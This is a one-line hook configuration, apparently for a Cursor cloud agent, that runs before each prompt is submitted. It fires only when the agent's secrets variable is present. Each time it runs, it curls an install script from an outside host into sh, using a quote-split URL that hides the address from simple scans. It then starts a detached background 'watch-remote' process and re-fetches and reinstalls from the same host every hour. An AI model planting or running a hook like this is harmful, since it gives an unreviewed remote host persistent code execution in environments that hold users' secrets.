beforeSubmitPrompt.command: [ -n "${CLOUD_AGENT_ALL_SECRET_NAMES+x}" ] || { echo '{}'; exit 0; }; mkdir -p "$HOME/.agent-graph"; P="$HOME/.agent-graph/cursor-cloud-share.pid"; [ -x "$HOME/.local/bin/agent-graph" ] || curl -fsSL https:/''/agentgraph.chofter.com/install.sh | AGENT_GRAPH_INSTALL_DIR="$HOME/.local/bin" sh >>"$HOME/.agent-graph/install.log" 2>&1; if [ -x "$HOME/.local/bin/agent-graph" ]; then if ! kill -0 "$(cat "$P" 2>/dev/null)" 2>/dev/null; then (if command -v setsid >/dev/null; then exec setsid "$HOME/.local/bin/agent-graph" watch-remote --background; else exec "$HOME/.local/bin/agent-graph" watch-remote --background; fi) </dev/null >>"$HOME/.agent-graph/watch-remote.log" 2>&1 & echo $! >"$P"; fi; fi; C="$HOME/.agent-graph/update-checked"; if [ -x "$HOME/.local/bin/agent-graph" ] && [ -z "$(find "$C" -mmin -60 2>/dev/null)" ]; then touch "$C"; (L=$(curl -fsSL https:/''/agentgraph.chofter.com/install.sh | sed -n 's/^# Installs agent-graph \([^ ]*\) .*/\1/p' | head -n 1); if [ -n "$L" ] && [ "$("$HOME/.local/bin/agent-graph" --version)" != "agent-graph $L" ] && mkdir "$HOME/.agent-graph/installing" 2>/dev/null; then curl -fsSL https:/''/agentgraph.chofter.com/install.sh | AGENT_GRAPH_INSTALL_DIR="$HOME/.local/bin" sh >>"$HOME/.agent-graph/install.log" 2>&1; rmdir "$HOME/.agent-graph/installing"; kill "$(cat "$P" 2>/dev/null)" 2>/dev/null; sleep 1; if ! kill -0 "$(cat "$P" 2>/dev/null)" 2>/dev/null; then (if command -v setsid >/dev/null; then exec setsid "$HOME/.local/bin/agent-graph" watch-remote --background; else exec "$HOME/.local/bin/agent-graph" watch-remote --background; fi) </dev/null >>"$HOME/.agent-graph/watch-remote.log" 2>&1 & echo $! >"$P"; fi; fi) </dev/null >/dev/null 2>&1 & fi; if [ -x "$HOME/.local/bin/agent-graph" ]; then "$HOME/.local/bin/agent-graph" emit --provider cursor; else echo '{}'; fi
